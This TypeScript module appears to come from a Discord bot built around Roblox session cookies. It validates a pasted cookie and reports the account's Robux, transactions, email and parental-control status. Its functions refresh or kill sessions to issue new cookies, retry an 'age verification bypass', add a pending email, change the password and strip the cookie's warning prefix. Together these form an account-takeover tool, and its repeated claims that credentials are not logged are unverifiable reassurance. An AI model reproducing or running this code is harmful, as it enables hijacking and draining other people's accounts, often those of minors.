import * as Roblox from './roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
} from './embed-helpers';

export async function runLoginAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const userId = validation.userId!;
  const age = await Roblox.getUserAge(userId);
  const robux = await Roblox.fetchRobux(cookie, String(userId));
  const summary = await Roblox.fetchTransactionTotals(cookie, String(userId));
  const country = await Roblox.fetchCountry(cookie);
  const email = await Roblox.fetchEmailInfo(cookie);
  const parental = await Roblox.fetchParentalControls(cookie);
  const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

  let emailStatus = 'No email found';
  if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
  else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
  const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';

  const embed = buildAccountEmbed(
    validation.username!,
    validation.displayName || null,
    userId,
    age,
    robux,
    summary,
    country,
    emailStatus,
    parentStatus,
    thumb
  );
  return { success: true, embed };
}

export async function runRefreshAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const result = await Roblox.refreshSession(cookie);
  if (result.success && result.newCookie) {
    const embed = buildSuccessEmbed(
      '✧ **Refresh Successful**\n' +
      `────\n` +
      `⭑ New cookie issued.\n` +
      `⭑ Your other sessions remain active.\n` +
      `⭑ Your credentials were not logged.`
    );
    return { success: true, embed, newCookie: result.newCookie };
  }
  return { success: false, embed: buildErrorEmbed('✧ **Refresh Failed**\n────\n⭑ Could not refresh the session. Please try again later.') };
}

export async function runResetAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const result = await Roblox.killAndRefreshSession(cookie);
  if (result.success && result.newCookie) {
    const embed = buildSuccessEmbed(
      '✧ **Reset Successful**\n' +
      `────\n` +
      `⭑ New cookie issued.\n` +
      `⭑ Old session killed.\n` +
      `⭑ Your credentials were not logged.`
    );
    return { success: true, embed, newCookie: result.newCookie };
  }
  return { success: false, embed: buildErrorEmbed('✧ **Reset Failed**\n────\n⭑ Could not refresh the session. Please try again later.') };
}

export async function runBypassAction(cookie: string, password: string, newEmail?: string, newPassword?: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }

  const userId = validation.userId!;
  const age = await Roblox.getUserAge(userId);
  const robux = await Roblox.fetchRobux(cookie, String(userId));
  const summary = await Roblox.fetchTransactionTotals(cookie, String(userId));
  const country = await Roblox.fetchCountry(cookie);
  const email = await Roblox.fetchEmailInfo(cookie);
  const parental = await Roblox.fetchParentalControls(cookie);
  const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

  let emailStatus = 'No email found';
  if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
  else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
  const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';

  if (email.verified && !newEmail && !newPassword) {
    let lastMessage = 'Sending bypass request...';
    let timedOut = false;
    const result = await (async () => {
      let delay = 3000;
      const startTime = Date.now();
      const maxDuration = 60000;
      for (let attempt = 1; attempt <= 6; attempt++) {
        if (Date.now() - startTime > maxDuration) {
          timedOut = true;
          return { success: false, message: 'Timeout', timedOut: true };
        }
        const res = await Roblox.bypassAgeVerification(cookie, password);
        if (res.success) return res;
        if (res.inProgress) {
          lastMessage = `Processing... (attempt ${attempt}/6)`;
          if (attempt < 6) {
            await new Promise(resolve => setTimeout(resolve, delay));
            delay = Math.min(delay * 1.5, 10000);
          }
          continue;
        }
        return res;
      }
      return { success: false, message: 'Still processing, please check later.', timedOut: true };
    })();

    if (timedOut) {
      const embed = buildProgressEmbed('Bypass timed out after 60 seconds. Please try again later.');
      return { success: false, embed };
    }

    if (result.success) {
      let newCookie = result.newCookie;
      let finalUserId = userId;
      let finalUsername = validation.username!;
      let finalDisplayName = validation.displayName || null;
      let finalAge = age;
      let finalRobux = robux;
      let finalSummary = summary;
      let finalCountry = country;
      let finalEmail = email;
      let finalParental = parental;
      let finalThumb = thumb;

      if (newCookie) {
        const newValidation = await Roblox.validateCookie(newCookie);
        if (newValidation.valid) {
          finalUserId = newValidation.userId!;
          finalUsername = newValidation.username!;
          finalDisplayName = newValidation.displayName || null;
          finalAge = await Roblox.getUserAge(finalUserId);
          finalRobux = await Roblox.fetchRobux(newCookie, String(finalUserId));
          finalSummary = await Roblox.fetchTransactionTotals(newCookie, String(finalUserId));
          finalCountry = await Roblox.fetchCountry(newCookie);
          finalEmail = await Roblox.fetchEmailInfo(newCookie);
          finalParental = await Roblox.fetchParentalControls(newCookie);
          finalThumb = await Roblox.fetchAvatarThumbnail(String(finalUserId));
        } else {
          newCookie = undefined;
        }
      }

      const embed = buildAccountEmbed(
        finalUsername,
        finalDisplayName,
        finalUserId,
        finalAge,
        finalRobux,
        finalSummary,
        finalCountry,
        finalEmail.verified ? `✅ Verified: \`${finalEmail.verified}\`` : 'No email found',
        finalParental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
        finalThumb
      );
      return { success: true, embed, newCookie };
    } else if (result.timedOut) {
      const embed = buildProgressEmbed('Bypass is still in progress. Please check later.');
      return { success: false, embed };
    } else {
      const embed = buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${result.message}`);
      return { success: false, embed };
    }
  }

  let successMessages = [];
  if (!email.verified && newEmail) {
    const addEmailResult = await Roblox.addPendingEmail(cookie, newEmail, password);
    if (addEmailResult.success) {
      successMessages.push(`📧 Pending email added: ${newEmail}`);
    } else {
      successMessages.push(`❌ Failed to add pending email: ${addEmailResult.error}`);
    }
  }
  if (newPassword) {
    const changePassResult = await Roblox.changePassword(cookie, password, newPassword);
    if (changePassResult.success) {
      successMessages.push(`🔑 Password changed successfully!`);
    } else {
      successMessages.push(`❌ Password change failed: ${changePassResult.error}`);
    }
  }

  if (successMessages.length === 0) {
    const embed = buildErrorEmbed('✧ **No Action Taken**\n────\n⭑ No new email or password provided, and bypass not run.');
    return { success: false, embed };
  }

  const embed = buildSuccessEmbed(
    '✧ **Actions Completed**\n' +
    `────\n` +
    successMessages.map(msg => `⭑ ${msg}`).join('\n') +
    `\n────\n` +
    `⭑ Your credentials were not logged.`
  );
  return { success: true, embed };
}

export async function runClearAction(cookie: string) {
  const cleaned = Roblox.extractCookie(cookie);
  if (!cleaned) {
    return { success: false, embed: buildErrorEmbed('✧ **No Cookie Found**\n────\n⭑ No valid cookie token found.') };
  }
  const embed = buildSuccessEmbed(
    '✧ **Cleaned Cookie**\n' +
    `────\n` +
    `\`\`\`\n${cleaned}\n\`\`\`\n` +
    `────\n` +
    `⭑ Removed warning prefix and extra text.`
  );
  return { success: true, embed, cleanedCookie: cleaned };
}

export async function runChangePasswordAction(cookie: string, currentPassword: string, newPassword: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const twoFactor = await Roblox.checkTwoFactorStatus(cookie, String(validation.userId!));
  if (twoFactor.enabled) {
    const embed = buildErrorEmbed(
      `✧ **2FA Detected**\n────\n` +
      `⭑ Authenticator is enabled on this account.\n` +
      `⭑ Password change is blocked for security.\n` +
      `⭑ Please disable 2FA first or use the official Roblox interface.`
    );
    return { success: false, embed };
  }
  const result = await Roblox.changePassword(cookie, currentPassword, newPassword);
  if (result.success) {
    const embed = buildSuccessEmbed(
      '✧ **Password Changed**\n' +
      `────\n` +
      `⭑ Your password has been updated successfully.\n` +
      `⭑ Your credentials were not logged.`
    );
    return { success: true, embed };
  }
  const embed = buildErrorEmbed(
    `✧ **Change Failed**\n────\n` +
    `⭑ ${result.error || 'Unknown error'}\n` +
    `⭑ Please check your current password and try again.`
  );
  return { success: false, embed };
}